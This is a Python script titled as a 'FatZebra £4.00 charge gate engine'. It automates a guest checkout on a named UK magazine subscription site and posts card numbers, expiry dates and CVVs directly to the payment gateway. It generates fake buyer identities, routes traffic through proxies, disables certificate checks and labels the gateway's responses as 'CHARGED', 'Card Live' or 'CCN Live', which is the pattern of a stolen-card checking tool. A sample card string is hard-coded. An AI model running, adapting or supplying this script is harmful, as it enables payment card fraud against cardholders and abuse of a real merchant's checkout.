"""
FatZebra £4.00 Charge Gate Engine
Target: isubscribe.co.uk & gateway.pmnts.io (FatZebra UK + CardinalCommerce)
"""
import sys, os
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import httpx
import time
import json
import random
import re
import base64

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def capture(text, start, end):
    try:
        s = text.split(start, 1)[1]
        return s.split(end, 1)[0]
    except Exception:
        return None

def clean_text(text):
    if not text:
        return "Unknown"
    cleaned = re.sub(r'<[^>]+>', ' ', text)
    return re.sub(r'\s+', ' ', cleaned).strip()

async def check_card_fz(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    """
    FatZebra £4.00 Charge Check on isubscribe.co.uk.
    Returns: (is_live, status_str, response_str, raw_text)
    """
    card_str = f"{cc}|{mm}|{yy}|{cvc}"
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    proxy_formatted = _format_proxy(proxy_url)

    first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first.lower()}.{last.lower()}{random.randint(100,999)}@gmail.com"

    headers_base = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    try:
        async with httpx.AsyncClient(proxy=proxy_formatted, follow_redirects=True, verify=False, timeout=30.0) as session:
            # 1. Product page & IDs
            r = await session.get("https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm", headers=headers_base)
            pi = capture(r.text, "prodId=", "&amp") or "66735"
            ps = capture(r.text, "prodSubId=", "&amp") or "8135328"

            # 2. Add to cart
            head2 = {**headers_base, "Host": "www.isubscribe.co.uk", "referer": "https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm"}
            r2 = await session.get(f"https://www.isubscribe.co.uk/cart.cfm?action=add&prodId={pi}&prodSubId={ps}&qty=1", headers=head2)
            if r2.status_code != 200:
                return False, "DECLINED ❌", f"Failed adding to cart (HTTP {r2.status_code})", r2.text[:200]

            # 3. Set billing address
            head3 = {
                **headers_base,
                "Host": "www.isubscribe.co.uk",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.isubscribe.co.uk",
                "referer": f"https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=bill&email={email}",
            }
            post3 = f"itemcount=1&guestcheckout=true&userid=&email={email}&title=Mr.&firstname={first}&lastname={last}&phone=19006318646&company=&street=1+Warwick+Road&suburb=Thames+Ditton&postcode=KT7+0PR&state=&otherstate=&country=United+Kingdom&prodsubid_1={ps}&prodtitle_1=She+Kicks+Magazine&emaildelivery_1=0&isdigital_1=0&isgiftvoucher_1=0&xmas_start_1=0&renewal_1=0&gift_1=0&senderfirstname_1=+&email_1=&message_1=&senddate_1=18%2F10%2F2023&address_1=billing&title_1=Mr.&firstname_1={first}&lastname_1={last}&company_1=&street_1=1+Warwick+Road&suburb_1=Thames+Ditton&postcode_1=KT7+0PR&state_1=United+Kingfonm&country_1=United+Kingdom&publisher_post=0&organisations_post=0&isubscribe_terms=1"
            await session.post("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setbilling&formmode=new&ajax=true", headers=head3, data=post3)

            # 4. Set card payment method
            if cc.startswith("3"):
                typec = "AMEX"
            elif cc.startswith("4"):
                typec = "VISA"
            else:
                typec = "Mastercard"

            head4 = {
                **headers_base,
                "Host": "www.isubscribe.co.uk",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=pay",
            }
            post4 = f"paymentMethod=creditcard&walletToken=&card={typec}"
            await session.post("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setpayment&formmode=new&ajax=true", headers=head4, data=post4)

            # 5. Extract FatZebra verification tokens
            head5 = {**headers_base, "Host": "www.isubscribe.co.uk", "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=pay"}
            r5 = await session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=confirm", headers=head5)
            r5_ = r5.text
            ve = capture(r5_, '"verification" value="', '"')
            if not ve:
                return False, "DECLINED ❌", "Failed extracting checkout verification token", r5_[:200]

            # 6. Direct gateway payment submission to FatZebra (pmnts.io)
            head13 = {
                **headers_base,
                "Host": "gateway.pmnts.io",
                "origin": "https://www.isubscribe.co.uk",
                "content-type": "application/x-www-form-urlencoded",
                "referer": "https://www.isubscribe.co.uk/",
            }
            post13 = f"return_path=https%3A%2F%2Fwww.isubscribe.co.uk%2Fssl%2Fcheckout%2Findex.cfm%3Fview%3Dnew%26step%3Dconfirm%26mode%3Dadmin%26action%3DplaceOrder%26source%3Dconfirm&verification={ve}&card_type={typec}&card_number={cc}&card_holder={first}+{last}&expiry_month={mm}&expiry_year={yy}&cvv={cvc}"
            r13 = await session.post("https://gateway.pmnts.io/v2/credit_cards/direct/isubscribeunitedkingdom", headers=head13, data=post13)
            
            # 7. Check final order confirmation status
            head14 = {**headers_base, "Host": "www.isubscribe.co.uk", "referer": "https://www.isubscribe.co.uk/"}
            r14 = await session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=returning&step=confirm&formmode=edit&source=confirm&error=true&errorno=05", headers=head14)
            r14_ = r14.text

            msg1 = capture(r14_, '<div class="alert alert-danger alert-dismissable" id="', '">')
            msg2 = capture(r14_, f'<div class="alert alert-danger alert-dismissable" id="{msg1}">', "<br>") if msg1 else None
            msg = clean_text(msg2) if msg2 else ""

            if r14.status_code == 302 or "Thank you for your order" in r14_ or "order_confirmation" in str(r14.url):
                return True, "CHARGED ✅", "Thank You For Your Order (£4.00)", r14_[:200]
            elif "insufficient funds" in msg.lower():
                return True, "APPROVED 🟩", "Insufficient Funds (Card Live)", r14_[:200]
            elif "security code" in msg.lower() or "cvv" in msg.lower() or "cvc" in msg.lower():
                return True, "APPROVED 🟩", "CVV Mismatch (CCN Live)", r14_[:200]
            elif "declined" in msg.lower() or "card issuer" in msg.lower() or "different card" in msg.lower():
                return False, "DECLINED 🔴", "Card Declined by Issuer", r14_[:200]
            elif msg:
                return False, "DECLINED 🔴", msg.replace("Credit Card Error:", "").strip(), r14_[:200]
            else:
                return False, "DECLINED 🔴", "Payment Declined", r14_[:200]

    except Exception as e:
        return False, "ERROR ⚠️", str(e), ""

if __name__ == '__main__':
    test_c = sys.argv[1] if len(sys.argv) > 1 else '4033060047342909|08|28|667'
    p = test_c.split('|')
    print(f"[*] Testing Standalone FatZebra Engine on: {test_c}")
    start = time.time()
    is_live, status, response, raw = asyncio.run(check_card_fz(p[0], p[1], p[2], p[3]))
    elapsed = round(time.time() - start, 2)
    print(f"\nStatus: {status}\nResponse: {response}\nTime: {elapsed}s")
